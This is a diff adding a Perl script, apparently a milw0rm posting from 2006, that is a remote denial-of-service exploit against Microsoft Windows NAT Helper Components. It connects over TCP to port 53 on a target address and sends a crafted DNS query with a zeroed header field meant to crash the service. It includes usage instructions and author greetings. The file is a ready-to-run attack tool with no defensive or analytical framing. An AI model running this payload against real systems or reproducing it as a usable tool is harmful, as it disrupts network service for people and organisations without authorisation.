@@ -1,0 +1,74 @@
+#!/usr/bin/perl
+##
+## Microsoft Windows NAT Helper Components Remote DoS Exploit (2)
+## **************************************************************
+##
+## .details
+## --------
+## Exploit(192.168.0.2) --> Microsoft NAT(192.168.0.1) --> [..Internet..]
+##
+## .info
+## -----
+## code by x82 <x82_ [at] bk [dot] ru>
+## bug by h07  <h07 [at] interia [dot] pl>
+##
+## .greetz
+## -------
+## ... goes out to triple6, wolf, lux2, EaTh, darkkilla, 2letterman .. ;)
+##
+##
+
+use warnings;
+use diagnostics;
+use strict;
+
+use IO::Socket;
+
+
+my $host = $ARGV[0]; # 192.168.0.1
+my $port = 53; # standard port
+my $payload =
+# by h07
+"\x6c\xb6".
+"\x01\x00".
+"\x00\x00".
+"\x00\x00".
+"\x00\x00".
+"\x00\x00". # <-- Bug is here 0x0000
+"\x03\x77\x77\x77".
+"\x06\x67\x6f\x6f".
+"\x67\x6c\x65\x03".
+"\x63\x6f\x6d\x00".
+"\x00\x01".
+"\x00\x01";
+
+my $length = length($payload);
+
+if((! $host || $host !~ /^\d{1,3}(\.\d{1,3}){3}$/))
+{
+	print "\n----------------------------------------------------------------------\n";
+	print "Microsoft Windows NAT Helper Components Remote DoS Exploit\n";
+	print "exploit by x82 <x82_ [at] bk [dot] ru>\n";
+	print "bug discovered by h07 <h07 [at] interia [dot] pl>\n";
+	print "----------------------------------------------------------------------";
+	print "\n";
+	print "usage: perl $0 192.168.0.1\n";
+	exit;
+}
+
+my $socket = IO::Socket::INET->new ( Proto => "tcp", PeerAddr => $host, PeerPort => $port);
+unless ($socket) { die "[-] Can\'t connect to $host" }
+
+print "\n";
+print "[+] connection established\n";
+print "[*] Sending payload ..." . "(size: $length)\n";
+sleep(5);
+
+print $socket $payload;
+
+print "[+] ok - payload sent\n";
+
+
+## 29.10.2006
+
+# milw0rm.com [2006-10-30]
